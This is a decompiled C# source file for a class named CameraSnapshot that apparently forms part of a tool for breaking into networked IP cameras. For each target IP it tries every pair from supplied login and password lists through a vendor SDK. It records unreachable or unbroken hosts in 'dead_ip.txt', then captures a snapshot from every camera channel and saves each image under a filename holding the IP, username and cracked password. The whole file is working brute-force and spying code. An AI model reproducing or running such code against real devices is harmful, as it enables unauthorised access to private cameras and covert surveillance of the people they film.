using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Example
{
	// Token: 0x02000002 RID: 2
	internal class CameraSnapshot
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		public void controlDevice()
		{
			int millisecondsTimeout = 15000;
			Thread.Sleep(millisecondsTimeout);
			this.GetNextSnapshot(true);
			bool flag = (long)this.channelNumber == (long)((ulong)(this.currentChannelNumber + 1U)) && this.channelAttempt + 1 == this.maxChannelAttempt;
			if (flag)
			{
				this.workEnd(this.ip);
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020A8 File Offset: 0x000002A8
		public CameraSnapshot(string ip, ushort port, string[] logins, string[] passwords, PlatformInvokeTest.WorkEndDelegate _workEnd)
		{
			this.ip = ip;
			this.port = port;
			this.logins = logins;
			this.passwords = passwords;
			this.workEnd = _workEnd;
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002124 File Offset: 0x00000324
		public void SnapshotCallback(long lLogin, IntPtr buffer, uint revLen, uint encodeType, uint cmdSerial, uint user)
		{
			object obj = this.threadLock;
			lock (obj)
			{
				try
				{
					this.controlDeviceThread.Abort();
					this.channelAttempt = 0;
					string text = "snapshots\\";
					bool flag2 = !Directory.Exists(text);
					if (flag2)
					{
						Directory.CreateDirectory(text);
					}
					string str = string.Format("{0}_{1}_{2}_{3}.jpg", new object[]
					{
						this.ip,
						this.logins[this.actualLoginNumber],
						this.passwords[this.actualPasswordNumber],
						cmdSerial
					});
					Console.WriteLine(string.Concat(new object[]
					{
						"[",
						this.ip,
						"] array length:",
						revLen
					}));
					byte[] array = new byte[revLen];
					Marshal.Copy(buffer, array, 0, (int)revLen);
					using (FileStream fileStream = new FileStream(text + str, FileMode.Create, FileAccess.Write))
					{
						fileStream.Write(array, 0, (int)revLen);
					}
					bool flag3 = (ulong)(this.currentChannelNumber + 1U) != (ulong)((long)this.channelNumber);
					if (flag3)
					{
						bool isError = cmdSerial != this.currentChannelNumber;
						this.GetNextSnapshot(isError);
					}
					else
					{
						this.workEnd(this.ip);
					}
				}
				catch (NullReferenceException ex)
				{
					Console.WriteLine("[" + this.ip + "] null pointer exception");
				}
				catch (AccessViolationException ex2)
				{
					Console.WriteLine("[" + this.ip + "] access violation exception");
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002330 File Offset: 0x00000530
		private void GetNextSnapshot(bool isError = false)
		{
			bool flag = (ulong)this.currentChannelNumber >= (ulong)((long)(this.channelNumber - 1));
			if (flag)
			{
				PlatformInvokeTest.CLIENT_Logout(this.loginId);
			}
			else
			{
				if (isError)
				{
					int num = this.channelAttempt;
					this.channelAttempt = num + 1;
					bool flag2 = num >= this.maxChannelAttempt;
					if (flag2)
					{
						this.currentChannelNumber += 1U;
						this.channelAttempt = 0;
					}
				}
				else
				{
					this.currentChannelNumber += 1U;
				}
				this.GetCurrentSnapshot();
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000023C0 File Offset: 0x000005C0
		public void GetCurrentSnapshot()
		{
			Console.WriteLine(string.Concat(new object[]
			{
				"[",
				this.ip,
				"] Get channel ",
				this.currentChannelNumber,
				" snapshot, attempt ",
				this.channelAttempt + 1
			}));
			SNAP_PARAMS par = new SNAP_PARAMS
			{
				Channel = this.currentChannelNumber,
				mode = 0U,
				ImageSize = 0U,
				CmdSerial = this.currentChannelNumber
			};
			this.StartControlThread();
			bool flag = PlatformInvokeTest.CLIENT_SnapPicture(this.loginId, par);
			Console.WriteLine("[" + this.ip + "] Snap picture result:" + flag.ToString());
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002488 File Offset: 0x00000688
		private void StartControlThread()
		{
			object obj = this.threadLock;
			lock (obj)
			{
				this.controlDeviceThread = new Thread(new ThreadStart(this.controlDevice));
				this.controlDeviceThread.Start();
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000024EC File Offset: 0x000006EC
		public bool Start()
		{
			int num = 0;
			long num2 = 0L;
			for (int i = 0; i < this.logins.Length; i++)
			{
				for (int j = 0; j < this.passwords.Length; j++)
				{
					num2 = this.tryLogin(this.logins[i], this.passwords[j], out num);
					bool flag = num2 != 0L;
					if (flag)
					{
						this.actualLoginNumber = i;
						this.actualPasswordNumber = j;
						break;
					}
				}
				bool flag2 = num2 != 0L;
				if (flag2)
				{
					break;
				}
			}
			bool flag3 = num2 == 0L;
			bool result;
			if (flag3)
			{
				File.AppendAllLines("dead_ip.txt", new string[]
				{
					this.ip
				});
				result = false;
			}
			else
			{
				this.channelNumber = num;
				Console.WriteLine(string.Concat(new object[]
				{
					"[",
					this.ip,
					"] Login device successful, channel numbers: ",
					this.channelNumber
				}));
				PlatformInvokeTest.SnapshotCallbackDelegate snapshotCallbackDelegate = new PlatformInvokeTest.SnapshotCallbackDelegate(this.SnapshotCallback);
				this.delegates.Add(snapshotCallbackDelegate);
				PlatformInvokeTest.CLIENT_SetSnapRevCallBack(snapshotCallbackDelegate, 0U);
				this.GetCurrentSnapshot();
				result = true;
			}
			return result;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002618 File Offset: 0x00000818
		public long tryLogin(string login, string password, out int _channelNumber)
		{
			_channelNumber = 0;
			LPNET_DEVICEINFO lpnet_DEVICEINFO = default(LPNET_DEVICEINFO);
			long num = 0L;
			this.loginId = PlatformInvokeTest.CLIENT_Login(this.ip, this.port, login, password, ref lpnet_DEVICEINFO, ref num);
			bool flag = this.loginId == 0L;
			long result;
			if (flag)
			{
				uint num2 = PlatformInvokeTest.CLIENT_GetLastError() - 2147483648U;
				Console.WriteLine("[" + this.ip + "] Login device failed");
				result = 0L;
			}
			else
			{
				_channelNumber = (int)lpnet_DEVICEINFO.byChanNum;
				result = this.loginId;
			}
			return result;
		}

		// Token: 0x04000001 RID: 1
		private string ip;

		// Token: 0x04000002 RID: 2
		private ushort port;

		// Token: 0x04000003 RID: 3
		private string[] logins;

		// Token: 0x04000004 RID: 4
		private string[] passwords;

		// Token: 0x04000005 RID: 5
		private PlatformInvokeTest.WorkEndDelegate workEnd;

		// Token: 0x04000006 RID: 6
		private long loginId;

		// Token: 0x04000007 RID: 7
		private int channelNumber = 0;

		// Token: 0x04000008 RID: 8
		private uint currentChannelNumber = 0U;

		// Token: 0x04000009 RID: 9
		private Thread controlDeviceThread;

		// Token: 0x0400000A RID: 10
		private object threadLock = new object();

		// Token: 0x0400000B RID: 11
		private int channelAttempt = 0;

		// Token: 0x0400000C RID: 12
		private int maxChannelAttempt = 1;

		// Token: 0x0400000D RID: 13
		private int actualLoginNumber = 0;

		// Token: 0x0400000E RID: 14
		private int actualPasswordNumber = 0;

		// Token: 0x0400000F RID: 15
		private List<PlatformInvokeTest.SnapshotCallbackDelegate> delegates = new List<PlatformInvokeTest.SnapshotCallbackDelegate>();
	}
}
